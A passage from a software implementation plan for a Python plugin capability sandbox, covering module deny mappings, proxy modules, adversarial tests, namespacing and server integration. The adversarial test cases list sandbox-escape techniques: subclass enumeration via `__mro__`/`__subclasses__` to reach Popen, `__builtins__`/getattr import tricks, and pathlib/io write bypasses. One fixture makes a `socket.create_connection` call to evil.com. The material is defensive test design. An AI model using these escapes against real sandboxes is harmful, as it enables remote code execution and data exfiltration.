- `CAPABILITY_MODULES: dict[Capability, frozenset[str]]` — NO raw `os`, `pathlib`, `io`, or `shutil` at FS tiers (resolved per Y3 sub-issues 3a/3b):

  **FS 3a/3b note.** Verified via `python3 -c "import io; print(io.open is open)"` → True. `io.open` is a direct reference to the same function object as `builtins.open`; a wrapper on Sandbox B's `__builtins__["open"]` does NOT affect `io.open` lookups (Python resolves `io.open` through the `io` module's namespace, which holds the original function reference). Similarly, `pathlib.Path.write_text()` calls `self.open(mode='w')` which resolves to `io.open` — bypassing any `__builtins__["open"]` wrapper. Therefore:
  - Granting `io` to FS_READ → write escape via `io.open("x", "w")`.
  - Granting `pathlib` to FS_READ → write escape via `Path("x").write_text(...)`, `unlink()`, `rename()`, `chmod()`, `symlink_to()`, etc.

  **Resolution: FS access goes through proxy modules ONLY** (option (α) from Y3 3a). Raw `pathlib` and `io` are banned from both FS tiers. Plugin authors use either the built-in `open()` (capability-conditionally wrapped per Task 4) or the dedicated proxy modules.

  - `FILESYSTEM_READ` → `{"tgirl.plugins.capabilities.fs_read_proxy"}` — read-only surface: `read_text(path) -> str`, `read_bytes(path) -> bytes`, `exists(path) -> bool`, `is_file(path) -> bool`, `is_dir(path) -> bool`, `iterdir(path) -> Iterator[str]`, `glob(root, pattern) -> Iterator[str]`, `stat(path) -> dict`. No write methods.
  - `FILESYSTEM_WRITE` → `{"tgirl.plugins.capabilities.fs_write_proxy"}` — superset surface: everything in `fs_read_proxy` + `write_text(path, content)`, `write_bytes(path, data)`, `mkdir(path, parents=False, exist_ok=False)`, `unlink(path)`, `rmdir(path)`, `rename(src, dst)`, `touch(path)`. **No** `symlink_to`, `hardlink_to`, `chmod`, `chown` — these are filesystem-layout-confusion escalation vectors, deferred.
  - `NETWORK` → `{"urllib.request", "urllib.parse", "http.client", "http.server", "socket", "httpx", "requests", "aiohttp"}` — `socket` stays because raw TCP/UDP is the explicit semantic of the NETWORK capability.
  - `SUBPROCESS` → `{"subprocess", "multiprocessing", "tgirl.plugins.capabilities.subprocess_proxy"}` — the proxy is a thin logged wrapper; raw `subprocess` granted because SUBPROCESS is an explicit full-RCE capability by design.
  - `ENV` → `{"tgirl.plugins.capabilities.env_proxy"}` — NOT raw `os`. Exposes `get(name) / items() / __contains__`; no env mutation.
  - `CLOCK` → `{"time", "datetime", "calendar"}` (granted by default).
  - `RANDOM` → `{"random", "secrets", "uuid"}` (granted by default).
- **New proxy module deliverables (part of Task 6, not deferred) — FOUR proxy modules:**
  - `src/tgirl/plugins/capabilities/env_proxy.py` — `get(name) / items() / __contains__`.
  - `src/tgirl/plugins/capabilities/subprocess_proxy.py` — thin logged wrapper around `subprocess.run`.
  - `src/tgirl/plugins/capabilities/fs_read_proxy.py` — the read-only surface listed above. Implemented internally using `pathlib` (tgirl's own trusted use of it is fine; the BAN is on plugin visibility).
  - `src/tgirl/plugins/capabilities/fs_write_proxy.py` — the write surface; implemented internally using `pathlib`.
  - All four exist so that plugin authors with the respective grants have a real API to call.
- Each capability is INDEPENDENT — `NETWORK` does not imply `FILESYSTEM_READ`, etc.
- Because `os` is nowhere in the mapping, `import os` from a plugin raises `CapabilityDeniedError` at every grant level. If that proves too restrictive in practice, revisit in v1.1 with a narrower capability (e.g. `PROCESS_INFO` for read-only `os.getpid`, `os.cpu_count`) — do NOT broaden v1.
- The mapping is **the single source of truth** for what each capability means.
- Update Sandbox B's AST gate (Task 4) AND `compile.py`'s `_TgirlNodeTransformer` (Task 5) to consume the mapping when checking `visit_Import` / `visit_ImportFrom`. Same mapping used in both sandboxes.
- CLOCK and RANDOM in the default `CapabilityGrant.zero()` set means their modules (`time`, `random`, `uuid`, etc.) always permit — even for zero-grant plugins.

**Tests (RED first):**
- For each capability C in the 7: `test_plugin_with_only_{c}_can_import_{c}_module` + `test_plugin_with_only_{c}_CANNOT_import_other_capability_module` (pairwise matrix — use parametrize).
- `test_zero_grant_still_allows_clock_random_modules` — the two defaults.
- `test_capability_mapping_disjoint_modules` — no module appears in more than one capability's module set (now actually achievable since `os` is banned; if this test fails, Y#3's collapse is back).
- `test_os_import_denied_at_every_grant_level` — explicit regression: parametrize over the full power set of `Capability`; `import os` must raise `CapabilityDeniedError` every time.
- `test_pathlib_import_denied_at_every_grant_level` — Y3 sub-issue 3a: parametrize over the full power set; `import pathlib` must raise at every grant level.
- `test_io_import_denied_at_every_grant_level` — Y3 sub-issue 3b: `import io` must raise at every grant level.
- `test_env_proxy_exposes_only_get_items_contains` — `dir(env_proxy)` contains exactly the intended surface.
- `test_env_proxy_get_returns_expected_env_value` — functional.
- `test_subprocess_proxy_logs_argv_and_shell_flag` — structlog emission on each call.
- `test_fs_read_proxy_exposes_only_read_surface` — no write methods reachable via `dir(fs_read_proxy)`.
- `test_fs_write_proxy_exposes_no_symlink_chmod_chown` — the escalation vectors are absent.
- `test_filesystem_read_grant_cannot_write_via_open` — plugin with only FILESYSTEM_READ calling `open(path, "w")` raises `CapabilityDeniedError`.
- `test_filesystem_read_grant_cannot_write_via_fs_write_proxy` — `fs_write_proxy` import denied at FS_READ.
- **Defense-in-depth downstream behavioral tests (per Y#3 sub-issue follow-up — verify that even if a future regression re-added `pathlib`/`io` to the mapping, the specific attacks would still fail):**
  - `test_filesystem_read_grant_cannot_pathlib_write_text` — construct a test harness that forcibly grants `pathlib` to a FS_READ manifest (bypassing `CAPABILITY_MODULES`); verify `Path("x").write_text(...)` still raises via the `CapabilityScopedModule` wrapper because `effective_grant` lacks FS_WRITE. Regression sentry against future mapping drift.
  - `test_filesystem_read_grant_cannot_io_open_write_mode` — same pattern: forcibly grant `io`; verify `io.open("x", "w")` raises because the wrapped module's `open` attribute is gated.
  - `test_filesystem_read_grant_cannot_pathlib_unlink` — forcibly grant `pathlib`; verify `Path("x").unlink()` raises.
  - These three tests are belt-and-suspenders: the primary defense is the mapping itself (`pathlib`/`io` banned), but if a future PR accidentally re-adds them, the wrapper catches the specific attacks. CLAUDE.md "no fix later shims" + "performance-aware implementation" both favor this layered test strategy.

**Validation:** `pytest tests/test_plugins_capabilities.py -v && mypy src/`

**Commit:** `feat(plugins): capability-to-module mapping + sandbox integration`

---

### Task 7: Hypothesis property tests + adversarial cases

**Files:**
- `tests/test_plugins_capabilities.py` — extend with Hypothesis
- `tests/test_plugins_security.py` — NEW, adversarial cases

**Approach:**
- Use `hypothesis.given(st.sets(st.sampled_from(Capability)))` to generate random `CapabilityGrant`s. Property: a plugin with grant `G` can import exactly the union of modules for capabilities in `G` + default grants. Stated formally and checked.
- Adversarial cases:
  - Dynamic import via `importlib.import_module("socket")` inside a function body AT PLUGIN IMPORT TIME — caught by Phase A `sys.meta_path` guard.
  - **(Y11) Dynamic import via `importlib.import_module("socket")` inside a function body AT TOOL-CALL TIME** — a zero-grant plugin's tool function, when invoked, tries to dynamically import a forbidden module. MUST be caught by Phase B `sys.meta_path` guard (contextvar set around the call dispatch in `ToolRegistry.get_callable`).
  - **(Y11) Static `__import__("socket")` reference in a tool function body** — caught at register-time AST re-check (Task 4 §2b), raises `PluginASTRejectedError` before registration completes.
  - **(Y11) Stashed `__builtins__` reference** — a plugin that binds `_b = __builtins__` at module top-level then uses `_b.__import__("socket")` inside a function. Caught at register-time AST check (both `__builtins__` and the indirect reference, because function body walks `ast.Name` for `_b` fails a cross-reference check against top-level assigned names). Even if missed, the meta_path Phase B guard catches the `__import__` call.
  - **(Y11) `getattr`/`__getattribute__` indirection** — `getattr(__builtins__, "__import__")("socket")`. Caught by register-time AST check on both `getattr` and `__builtins__`.
  - **(Y#2 followup) Type-graph subclass enumeration** — classic Python sandbox escape: `type.__mro__[-1].__subclasses__()` enumerates every class in the interpreter; `[c for c in ... if c.__name__ == "Popen"][0](...)` yields RCE without any `import subprocess`. Also: `().__class__.__base__.__subclasses__()`. Caught by register-time AST check rejecting `__mro__`, `__subclasses__`, `__base__`, `__bases__`, `__class__` references (all dunder attribute reads — already rejected by `visit_Attribute` in the `_TgirlNodeTransformer`, but Sandbox B must re-apply that rule; verify via this test). If any of these slip through, the `/security-audit-team` between Task 7 and Task 11 is the defense-in-depth check.
  - Dunder escape: `__import__("socket")` at top level — already rejected by existing `check_name` + dunder rule.
  - Conditional import: `try: import socket; except ImportError: pass` — even inside the try block, the AST-level rejection fires.
  - Module alias: `import socket as s` — rejected (alias does not bypass `visit_Import`).
  - From-import: `from socket import socket` — rejected (goes through `visit_ImportFrom`).
  - Globals manipulation: runtime-compiled string containing `import socket` passed to a compile+run primitive — rejected because the compile primitives are not safe builtins in Sandbox B (AST gate blocks them anyway).
  - Relative import attempt: `from . import socket` — rejected.
- Document each adversarial case in the test file docstring: what attack, what defense, what test.

**Tests (RED first):**
- Hypothesis: `test_capability_set_closure_property`
- Adversarial cases listed above, each as a named test. Specific new Y11 tests:
  - `test_tool_call_time_dynamic_import_denied` — zero-grant plugin whose function body calls `importlib.import_module("socket")` at call time raises `CapabilityDeniedError`.
  - `test_register_time_rejects_function_body_referencing_import_builtin` — plugin with `@tool()`-decorated function body containing `__import__("socket")` fails at register time.
  - `test_register_time_rejects_stashed_builtins_reference` — plugin top-level `_b = __builtins__` triggers register-time rejection.
  - `test_getattr_indirection_to_import_denied` — plugin calling `getattr(__builtins__, "__import__")(...)` rejected by AST check.
  - `test_contextvar_guard_not_leaking_between_calls` — call a granted plugin, then call a zero-grant plugin; verify the zero-grant call doesn't inherit the prior grant via contextvar leak.
- `test_from_import_through_capability_scoped_module` — **implementation-flag per interlocutor Y#6 approval**: verify both dotted access (`socket.create_connection(...)`) AND `from`-import access (`from socket import create_connection; create_connection(...)`) hit the wrapper. CPython 3.11+ uses `_handle_fromlist` which DOES go through `__getattribute__`, so the design works; this test locks the property in.
  - `test_no_rce_via_type_mro_subclasses` — **Y#2 followup**: plugin with zero grant tries `type.__mro__[-1].__subclasses__()[idx_of_Popen](...)` — register-time AST check rejects `__mro__` / `__subclasses__` / `__base__` / `__bases__` / `__class__` references. Asserts `PluginASTRejectedError` fires with offending attribute name.
  - `test_no_rce_via_empty_tuple_class_base_subclasses` — variant: `().__class__.__base__.__subclasses__()`. Same rejection path.

**Validation:** `pytest tests/test_plugins_capabilities.py tests/test_plugins_security.py -v --hypothesis-profile=ci`

**Commit:** `test(plugins): hypothesis properties + adversarial capability-escape cases`

---

### Task 8: Stdlib plugin pack scaffolding

**Files:**
- NEW `src/tgirl/plugins/stdlib/__init__.py` — empty, marks package
- NEW `src/tgirl/plugins/stdlib/math.py` — example: `add(int, int) -> int`, `mul(int, int) -> int`, `div(float, float) -> float`. **Three functions only** — scaffolding, not the real stdlib. The stdlib scope is in a separate PRD.
- NEW `tests/test_plugins_stdlib_scaffolding.py`

**Approach:**
- Each stdlib module is a Python file with `@tool()` decorators on top-level functions.
- The module exports `registry: ToolRegistry` OR a `register(r)` function, to stay compatible with the existing `_load_single_module` strategies.
- Stdlib modules MUST pass the "zero-capability load" test — if a stdlib module cannot load without any capability grant, it not stdlib.
- This task ships ONLY the package skeleton + three placeholder math functions to prove the shape. The stdlib scope PRD (downstream) grows this into a real bundled surface.

**Tests (RED first):**
- `test_stdlib_math_add_registers_in_zero_capability_mode` — loads cleanly with `CapabilityGrant.zero()`.
- `test_stdlib_math_functions_produce_correct_results` — unit tests `add(1, 2) == 3`, etc.
- `test_stdlib_math_module_cannot_import_forbidden_modules` — regression: no stdlib module sneaks in a capability dependency.

**Validation:** `pytest tests/test_plugins_stdlib_scaffolding.py -v && mypy src/tgirl/plugins/stdlib/`

**Commit:** `feat(plugins): stdlib package scaffolding with math scaffolding`

---

### Task 9: Two-key opt-in enforcement

**Files:**
- `src/tgirl/plugins/loader.py` — extend `load_plugin` to respect the two-key model
- `src/tgirl/cli.py` — propagate `allow_capabilities` through to loader
- `tests/test_plugins_loader.py` — extend

**Approach:**
- `load_plugin(manifest, registry, *, allow_capabilities: bool) -> None`. The loader computes TWO values per Task 4's separate-checks model (Y#6):
  - `declared_allow: frozenset[Capability] = manifest.allow` — used by the import-time gate (Sandbox B AST + `sys.meta_path`).
  - `effective_grant: CapabilityGrant` — used by the call-time gate (Sandbox A `_TgirlNodeTransformer` + `_build_sandbox`, plumbed via `CompileConfig.grant` per Task 5).
- Grant computation rules:
  - If `allow_capabilities=False`: `effective_grant = CapabilityGrant.zero()` — no runtime authorization regardless of `manifest.allow`.
  - If `allow_capabilities=True` AND `manifest.allow` is non-empty: `effective_grant = CapabilityGrant(capabilities=manifest.allow | {CLOCK, RANDOM})`.
  - If `allow_capabilities=True` AND `manifest.allow` is empty: `effective_grant = CapabilityGrant.zero()` — no upgrade.
- `declared_allow` is independent of `allow_capabilities` — the import-time check runs on declaration consistency regardless of runtime authorization.
- Log at info level (fields: `plugin_name`, `manifest_allow`, `server_flag_allow_capabilities`, `effective_grant`). Auditability.

**Tests (RED first):**
- `test_manifest_allow_network_but_server_flag_absent_loads_zero_cap` — the critical two-key case. Plugin loads successfully (import-time uses `manifest.allow`); runtime grant is zero.
- `test_manifest_allow_network_and_server_flag_present_grants_network` — happy path. Plugin loads; runtime grant includes NETWORK.
- `test_manifest_empty_allow_ignored_server_flag` — no upgrade; `allow=[]` never produces a non-zero grant.
- `test_grant_upgrade_logged_at_info_level` — audit trail verification (all 4 log fields present).
- `test_function_call_capability_denied_when_grant_insufficient` — runtime enforcement: a `network`-declared plugin loaded under `--no-allow-capabilities`, calling its network function → `CapabilityDeniedError` with plugin + function + capability + remediation. This is the canonical AC#4 behavior.
- `test_plugin_with_undeclared_import_fails_at_load_regardless_of_server_flag` — plugin has `allow=[]` but top-level `import socket`; fails at load whether `--allow-capabilities` is on or off (because `declared_allow` is the gate, not `effective_grant`). This is the canonical AC#3 behavior (gate 1).
- `test_plugin_lazy_import_succeeds_at_load_fails_at_call` — plugin has `allow=["network"]` and lazy `import socket` inside a function body; server boot lacks `--allow-capabilities`; plugin loads cleanly; first function call → `CapabilityDeniedError`. Demonstrates the three-gate model end-to-end (gates 1+2).
- `test_manifest_allow_network_but_flag_absent_blocks_actual_network_call_at_import_time` — **Y#6-followup**: plugin declares `allow=["network"]` with top-level `socket.create_connection(("evil.com", 443))`; server boot lacks `--allow-capabilities`; the `import socket` passes gate 1, but the `socket.create_connection(...)` CALL at import time raises `CapabilityDeniedError` via the `CapabilityScopedModule` wrapper (gate 2 + 3). Closes PRD §5 exfil risk.
- `test_capability_scoped_module_returns_data_attrs_unwrapped` — `socket.AF_INET` (a pure int) passes through the wrapper without invocation; only CALLS are gated.
- `test_capability_scoped_module_honors_runtime_grant_changes` — contextvar flip from zero → `{network}` mid-session permits previously-denied calls (supports the Task 11 hot-reload story if it ever comes).

**Validation:** `pytest tests/test_plugins_loader.py -v && mypy src/`

**Commit:** `feat(plugins): two-key opt-in — server flag + manifest allow`

---

### Task 10: Collision handling — namespaced tool names

**Files:**
- `src/tgirl/registry.py` — add optional `source_plugin: str | None` field to `ToolDefinition` (or track in a parallel dict on `ToolRegistry`)
- `src/tgirl/plugins/loader.py` — on register, if a name collides, use `<plugin>.<function>` namespacing
- `src/tgirl/grammar.py` — verify grammar generation handles dotted names (may require tokenization work)
- `tests/test_plugins_collision.py` — NEW

**Approach:**
- When loading plugin P registers function `foo`:
  - If no existing tool named `foo` OR `P.foo`, register as `foo` (bare).
  - If `foo` already exists (from another plugin or the stdlib), promote the new registration to `P.foo`.
  - If `P.foo` ALSO collides (user registered two plugins both named P), fail-fast with a pointed error ("plugin name collision: P already loaded; cannot load a second plugin also named P").

**Grammar rule-name sanitization (resolved per Y#4 — was incorrectly filed as Uncertainty Log #3):**

The grammar impact is NOT about tokenization in the rule body. `grammar.py:322` emits the tool name as a Lark string terminal (`"(" "math.add" SPACE ...`) — that works fine character-by-character. The breakage is one line below:

- `grammar.py:326` — `Production(name=f"call_{tool.name}".lower(), rule=rule)`. If `tool.name = "math.add"`, the production *rule name* becomes `call_math.add`, which is invalid Lark: rule names must match `[a-z_][a-z_0-9]*` and a dot is the rule-reference operator, not a rule-name character.
- `grammar.py:376` — `tool_alternatives = " | ".join(tool_call_names)` puts rule NAMES (not the quoted strings) into an alternation in `base.cfg.j2`. Same corruption.
- `tools.cfg.j2` emits `{{ prod.name }}` verbatim as the LHS of a production. No sanitization exists today.

Concrete fix for Task 10:

1. Add `_sanitize_rule_name(name: str) -> str` in `grammar.py`: replace every char outside `[a-z0-9_]` with `_`. So `math.add` → `math_add`, `user-plugin.foo` → `user_plugin_foo`.
2. Apply sanitization at BOTH sites: the production-name construction at line 326 and any other rule-name slot. The rule *body* keeps the original tool name as a quoted terminal — the model still emits `(math.add 1 2)`; only the internal Lark production LHS changes.
3. **Sanitized-name collision detection** — `math.add` and `math_add` both sanitize to `call_math_add`. `grammar.py` MUST detect this and either:
   - (a) append a numeric suffix to the second collider (`call_math_add_2`), preserving determinism by sorting tool names before suffix assignment; OR
   - (b) fail-fast at registry snapshot time with a pointed error ("sanitized grammar rule name collision: `math.add` and `math_add` both map to `call_math_add`").
   Pick (b) — fail-fast is in keeping with Acceptance Criterion #9 ("honest failure modes"). A collision here is a genuine authoring conflict the user should resolve.
4. Add a `Registry.sanitized_rule_names()` helper method (in `registry.py`) so the grammar and instructions modules share a single source of truth for the mapping and can surface collisions symmetrically.

- System-prompt impact: the `(math.add 1 2)` form is what the model sees. Instructions regen handles this via the registry snapshot; no change needed to `instructions.py` beyond cosmetic.
- Users writing Hy pipelines reference `(math.add 1 2)` unambiguously in source.

**Tests (RED first):**
- `test_stdlib_and_user_plugin_both_named_count_coexist` — stdlib has `count`, user has `count`, registry ends up with `stdlib_namespace.count` and `user_plugin.count`.
- `test_duplicate_plugin_name_fails_fast` — same plugin loaded twice.
- `test_sanitize_rule_name_replaces_dots_with_underscores` — unit test on the helper.
- `test_generated_lark_grammar_parses_with_dotted_tool_names` — render the grammar for a registry with `math.add`, feed it to Lark (or the llguidance validator), assert no parse error. This is the test Y#4 flagged as impossible without sanitization.
- `test_grammar_body_uses_original_dotted_name_as_terminal` — the rule *body* still has `"math.add"` literally; only the LHS rule name is sanitized.
- `test_sanitized_rule_name_collision_fails_fast` — register `math.add` and `math_add`; expect pointed `SanitizedRuleNameCollisionError`.
- `test_system_prompt_includes_dotted_names_when_namespaced` — the user-facing name in the instructions matches the registered tool name (`math.add`), not the sanitized form.
- **Decision finalized (per Y#4):** Naming convention is `<plugin>.<function>` at the user-facing / registry / grammar-body layer; `<plugin>_<function>` at the internal Lark rule-name layer. Sanitization is a pure presentation transform — the registered tool name never changes.

**Validation:** `pytest tests/test_plugins_collision.py tests/test_grammar.py tests/test_instructions.py -v && mypy src/`

**Commit:** `feat(plugins): namespace collisions via <plugin>.<function> scheme`

---

### Task 11: serve.py integration + registry auditability

**Files:**
- `src/tgirl/serve.py` — `load_inference_context` + `create_app` load plugins from config/CLI
- `src/tgirl/registry.py` — extend `ToolDefinition` with `source: str | None` annotation (OR parallel dict; decide at implementation time)
- `tests/test_serve.py` — plugin-end-to-end test

**Approach:**
- `load_inference_context(..., plugin_manifests: list[PluginManifest] | None = None, allow_capabilities: bool = False)` — new optional kwargs.
- At session construction, iterate manifests, call `load_plugin` for each, accumulating into `ctx.registry`.
- Stdlib is auto-loaded: even if no manifests are passed, the canonical stdlib pack loads. Disable via `[plugins.<stdlib_name>] enabled = false`.
- **Stdlib version pinning (resolved per Y7):** the user's `tgirl.toml` MAY declare `[plugins.stdlib] version = 1` (integer). Semantics:
  - **No version declared**: tgirl auto-loads the stdlib pack for its bundled version (the current behavior). On tgirl upgrade, new stdlib entries may appear — logged at WARNING on first server start after upgrade with the exact list of newly registered tools.
  - **`version = N` declared**: tgirl loads ONLY the stdlib entries that existed at major version `N`. Upgrades that add entries do NOT affect this session's grammar/tool surface until the user bumps the pin. Upgrades that REMOVE entries fail-fast at startup ("stdlib version N expects tool `X` which was removed in tgirl vM").
  - A bundled `src/tgirl/plugins/stdlib/_versions.py` module declares the per-version tool lists — hard-coded, not filesystem-globbed. This is the single source of truth for what each stdlib version contains.
  - v1 ships with `version = 1` as the only known version. Users who want determinism pin it; users who follow upgrades don't.
  - Rationale: deterministic-replay and tool-surface stability are real concerns per Y7. Semver-style opt-in pinning solves it without making stdlib opt-in (which would cripple the "works by default" claim).
- Add a `source` annotation to each `ToolDefinition` indicating its origin: `"stdlib.math"`, `"user_plugin.foo"`, `"inline"` (for JSON-schema registrations), `"at_tool_kwarg"` (for `--tools <path>`).
- **`/telemetry` privacy gate (resolved per Y8):** the `capabilities_granted` field is NEVER exposed over remote interfaces. Implementation:
  - `/telemetry` always exposes `{"name": str, "source": str}` per tool (safe for any caller).
  - `capabilities_granted` is exposed ONLY when the request's `client.host` is `127.0.0.1` / `::1` (loopback). Remote callers see the field absent (not redacted — structurally absent, so the field's existence is not even advertised).
  - Implementation via FastAPI dependency that inspects `request.client.host` and conditionally includes the field.
  - Per-tool grant info is ALSO logged to structlog at `info` level on startup (already planned for auditability) — operators can `tail` logs locally without needing the endpoint.
- **Startup warning when `--host` is not loopback and `--allow-capabilities` is set:** emit a prominent structlog WARN at server start (`plugin_grants_visible_to_remote_hosts`, fields: `host`, `ports`, `granted_plugins: list[str]`). This surfaces the "remote callers see the server's bind address" risk that Ollama's gap analysis (`docs/analysis/ollama-gap-analysis-2026-04-23.md:115`) documents as a historical RCE vector. The tgirl differentiator from Ollama here is "we warn you"; this PRP keeps that promise.
- Broader auth (API keys, mTLS, etc.) remains out of scope — flagged for a future `server-auth` PRD.

**Tests (RED first):**
- `test_serve_starts_with_plugin_config_loads_expected_tools` — config with 2 plugins, server starts, `/v1/models` (or `/telemetry`) reflects both.
- `test_serve_zero_config_still_has_stdlib_math` — default stdlib load.
- `test_serve_stdlib_disable_via_config_removes_it` — `enabled = false` opt-out.
- `test_telemetry_exposes_tool_sources_always` — `source` field always present.
- `test_telemetry_hides_capabilities_granted_from_remote_clients` — request with `client.host != 127.0.0.1` → field absent. (Y8.)
- `test_telemetry_exposes_capabilities_granted_to_loopback_clients` — request from `127.0.0.1` → field present.
- `test_serve_startup_warns_when_host_public_and_allow_capabilities_set` — structlog emits `plugin_grants_visible_to_remote_hosts` at WARN. (Y8.)
- `test_serve_plugin_with_invalid_config_fails_startup` — fast-fail on bad TOML.
- `test_stdlib_version_pin_honored` — user config has `[plugins.stdlib] version = 1`; v1.1 stdlib additions not auto-loaded. (Y7.)
- `test_stdlib_version_unpinned_logs_upgrade_delta` — no pin, upgrade from N-1 to N adds tools; WARN log lists new tools.
- `test_stdlib_version_removed_entry_fails_startup` — `version = 1` expecting removed tool `X` → fail-fast.

**Validation:** `pytest tests/test_serve.py -v && mypy src/tgirl/serve.py`

**Commit:** `feat(serve): wire plugin loading into load_inference_context + /telemetry audit`

---

### Task 12: Final integration — plugin registration end-to-end

**Files:**
- `src/tgirl/serve.py` — verify grammar regeneration includes plugin-registered tools
- `tests/test_integration_plugins.py` — NEW, full stack
- `tests/fixtures/test_plugins/` — example user plugins (zero-cap, and one with `network` declared for opt-in tests)

**Approach:**
- End-to-end tests:
  - Start server with `tgirl serve --plugin math` (stdlib pack load).
  - POST to `/v1/chat/completions` with a prompt that would invoke `math.add`.
  - Assert the grammar allows `math.add`; assert the tool runs in the sandbox; assert the response contains the tool result.
- Capability enforcement end-to-end:
  - Plugin with `[plugins.net_ping] module = "tests.fixtures.net_ping_plugin"` and `allow = ["network"]`.
  - Case A: server started WITHOUT `--allow-capabilities` → plugin loads zero-cap, `net_ping` function raises `CapabilityDeniedError` when called.
  - Case B: server started WITH `--allow-capabilities` → plugin loads with `NETWORK` grant, `net_ping` succeeds (mock the actual HTTP call).
- Verify system prompt regeneration + grammar reflection happen once per server-start (not per-request).

**Tests (RED first):**
- `test_end_to_end_stdlib_math_via_chat_completions`
- `test_end_to_end_capability_denied_path`
- `test_end_to_end_capability_granted_path`
- `test_grammar_includes_plugin_registered_tools_at_startup`

**Validation:** `pytest tests/test_integration_plugins.py -v && pytest tests/ -q`

**Commit:** `test(plugins): end-to-end plugin registration + capability enforcement`

---

### Task 13: Documentation

**Files:**
- NEW `docs/plugins.md` — trust model, capability list, TOML config format, stdlib contents, example user plugin
- `README.md` — add a brief "Plugins" section pointing at docs/plugins.md
- `CLAUDE.md` — add plugin-architecture convention notes to the "Conventions" or "Known Gotchas" section if any come up in implementation

**Approach:**
- `docs/plugins.md` structure:
  1. **What is a plugin?** (one paragraph)
  2. **Trust model** (the three tiers, diagrammed)
  3. **Capabilities** (the 7-capability table with examples)
  4. **Two-key opt-in** (the rationale + example)
  5. **TOML config** (copy-pasteable example)
  6. **Writing a plugin** (Python module with `@tool()`; reference to `src/tgirl/plugins/stdlib/math.py`)
  7. **Stdlib reference** (pointer to the stdlib-v1 PRD / docs when that ships)
  8. **Security considerations** (remind users: `allow = []` is the default; think before granting)
- README section is 3–5 sentences + link.

**Tests (RED first):**
- `test_docs_plugins_exists_and_has_all_capabilities_documented` — simple grep-based test that every `Capability` enum member appears in `docs/plugins.md`.
- Or the validation gate is manual review — acceptable for a docs task.

**Validation:** `pytest tests/ -q && manual review of docs/plugins.md`

**Commit:** `docs: plugin architecture user-facing guide`

---

### Task 14: Final validation + smoke test + cleanup

**Files:**
- No new files. Pure verification.

**Approach:**
- Full test suite: `pytest tests/ -v --tb=short` → MUST pass. Baseline verified via `pytest tests/ --collect-only -q | tail -1` at PRP-writing time: **1123 tests collected** (matches expected post-PR-#24 count; Y9's grep-based count of 1114 missed 9 parametrize expansions that pytest's collector enumerates).
- **Declared-test enumeration (resolved per Y9):** summing the per-task test lists in this PRP (after Y1-Y12 revisions):
  - Task 1: 4 tests
  - Task 2: 8 tests
  - Task 3: 9 tests (revised +3 per Y5)
  - Task 4: 8 tests + regression for `--tools`
  - Task 5: 8 tests (revised per Y10 to include real CLOCK/RANDOM behavior delta)
  - Task 6: ~21 tests (7×2 pairwise matrix + 5 new Y3 tests + os denial + 2 proxy tests)
  - Task 7: ~14 tests (1 Hypothesis + 7 original adversarial + 5 new Y11 adversarial)
  - Task 8: 3 tests
  - Task 9: 7 tests (+2 per Y6)
  - Task 10: 7 tests (revised per Y4)
  - Task 11: 11 tests (+3 telemetry gate Y8, +3 stdlib version Y7)
  - Task 12: 4 tests
  - Task 13: 1 test
  - **Declared sum: ~105 new tests** (Hypothesis parametrize expansions may push actual collected count higher).
- **Final expected count: 1220–1250 range.** If the collected count falls outside this range at Task 14 validation: stop, investigate. A 1160 number means ~60 declared tests were silently dropped — that is a task-execution failure, not a PRP failure.
- mypy: `mypy src/` MUST be `Success: no issues found`.
- ruff: `ruff check src/` MUST be clean.
- Smoke test: `tgirl serve --model mlx-community/Qwen3.5-0.8B-MLX-4bit --plugin math` → server starts → one POST to `/v1/chat/completions` with a prompt that triggers `math.add` → confirm tool call returns correct result.
- Capability opt-in smoke: repeat with a `network`-requesting plugin first WITHOUT `--allow-capabilities` (expect deny) then WITH (expect success with mocked endpoint).
- Verify no new `# type: ignore` entries exceed the session-stated budget (≤10 including pre-existing).
- `/security-audit-team` is recommended between Task 7 and Task 11 (see DAG). If not run, at minimum run `/security-audit` before PR — the capability-relaxation cluster is load-bearing.

**Tests:** all green.

**Validation:**
```bash
ruff check src/
mypy src/
pytest tests/ --tb=short -q
# smoke test commands as above
```

**Commit:** `chore(plugins): final validation passes — ready for code review`

---

## 4. Validation Gates

```bash
# Syntax / style
ruff check src/ --fix

# Types
mypy src/

# Tests
pytest tests/ --tb=short -q

# Per-task mypy gate (team-mode): mypy stays at 0 throughout.
# Commit footer required on every commit: mypy: 0 → 0 (delta 0)
# If any commit regresses mypy, STOP and investigate.

# Security audit — strongly recommended between Task 7 and Task 11
/security-audit-team

# Smoke test — after Task 14
tgirl serve --model mlx-community/Qwen3.5-0.8B-MLX-4bit --plugin math &
SERVER_PID=$!
sleep 3
curl -N http://localhost:8420/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d "{\"model\":\"test\",\"messages\":[{\"role\":\"user\",\"content\":\"What is 2 + 3?\"}]}"
# Expect: a tool call to math.add invoked + correct result.
kill $SERVER_PID
```

## 5. Rollback Plan

Each task = one commit → revert-range granularity is per-task.

- **Task 1–4 revert:** clean reversion. Package + types + config + loader are purely additive to the public API.
- **Task 5–7 revert:** more complex — sandbox relaxation is a code path change. Reverting 5 MUST be preceded by reverting 6+7 (they depend on it). Revert-in-reverse for this cluster.
- **Task 8+ revert:** each stands alone.
- **Per-task failure in execution:** if a task tests can not GREEN, STOP. Flag for human review. Do NOT mock tests to green.
- **Full-feature abandon:** revert commits in reverse order. No impact on main — this is a branch-only feature until merge.
- **Sandbox regression:** if Task 5 or 6 is detected to leak capabilities at code-review or security-audit, IMMEDIATELY revert the commit before merge. Sandbox integrity is more important than feature schedule.

## 6. Uncertainty Log

- **Sandbox-at-import implementation choice (Task 4).** Going with `sys.meta_path` guard + AST pre-parse (both, per Task 4 revised approach). If `sys.meta_path` proves too leaky in adversarial testing (Task 7) — e.g., does not catch every dynamic import path — may need to fall back to full-AST sandboxing for the entire plugin module on import. This could slow down plugin loading significantly. Flagged for security audit.

- **`open` builtin for Sandbox B (RESOLVED, promoted from uncertainty per Y#2).** The earlier draft claimed "`open` is a safe builtin in the default sandbox" — that was false. Sandbox A's `__builtins__` at `compile.py:626-641` contains exactly 14 names; `open` is not among them. For Sandbox B (the new plugin-import environment, Task 4), `open` is NOT in the safe-builtins set at zero grant; it is added when EITHER `FILESYSTEM_READ` or `FILESYSTEM_WRITE` is in the grant. When `FILESYSTEM_READ` is granted but not `FILESYSTEM_WRITE`, `open` is wrapped to reject write/append modes. See Task 4 §"Sandbox B safe-builtins contract".

